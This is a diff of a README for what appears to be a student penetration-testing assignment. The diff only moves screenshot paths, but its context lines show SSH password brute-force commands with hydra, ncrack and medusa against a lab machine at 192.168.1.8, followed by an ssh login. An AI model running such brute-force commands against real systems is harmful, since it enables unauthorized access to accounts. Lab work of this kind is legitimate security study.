@@ -65,7 +65,7 @@ https://user-images.githubusercontent.com/17487644/32114550-0fdae0cc-bb6e-11e7-8
 ```
 hydra -l ubuntuserver -P '/root/Desktop/passw.txt' 192.168.1.8 -t 4 ssh
 ```
-![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/1hydra.PNG?raw=true)
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/tugas-1/img/no%20counter/1hydra.PNG?raw=true)
 
 #### NCrack
 
@@ -74,7 +74,7 @@ hydra -l ubuntuserver -P '/root/Desktop/passw.txt' 192.168.1.8 -t 4 ssh
 ```
 ncrack -p 22 --user ubuntuserver -P '/root/Desktop/passw.txt' 192.168.1.8 
 ```
-![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/2-ncrack.PNG?raw=true)
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/tugas-1/img/no%20counter/2-ncrack.PNG?raw=true)
 
 #### Medusa
 
@@ -83,8 +83,8 @@ ncrack -p 22 --user ubuntuserver -P '/root/Desktop/passw.txt' 192.168.1.8
 ```
 medusa -u ubuntuserver -P '/root/Desktop/passw.txt' -h 192.168.1.8 -M ssh 
 ```
-![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/med1.PNG?raw=true)
-![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/med2.PNG?raw=true)
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/tugas-1/img/no%20counter/med1.PNG?raw=true)
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/tugas-1/img/no%20counter/med2.PNG?raw=true)
 
 #### Uji Masuk SSH
 1. Masuk ke SSH
@@ -92,7 +92,7 @@ medusa -u ubuntuserver -P '/root/Desktop/passw.txt' -h 192.168.1.8 -M ssh
 ```
 ssh ubuntuserver@192.168.1.8
 ```
-![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/coba%20masuk%20ssh%20server.PNG?raw=true)
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/tugas-1/img/no%20counter/coba%20masuk%20ssh%20server.PNG?raw=true)
 
 
 ## Uji Penetrasi 2
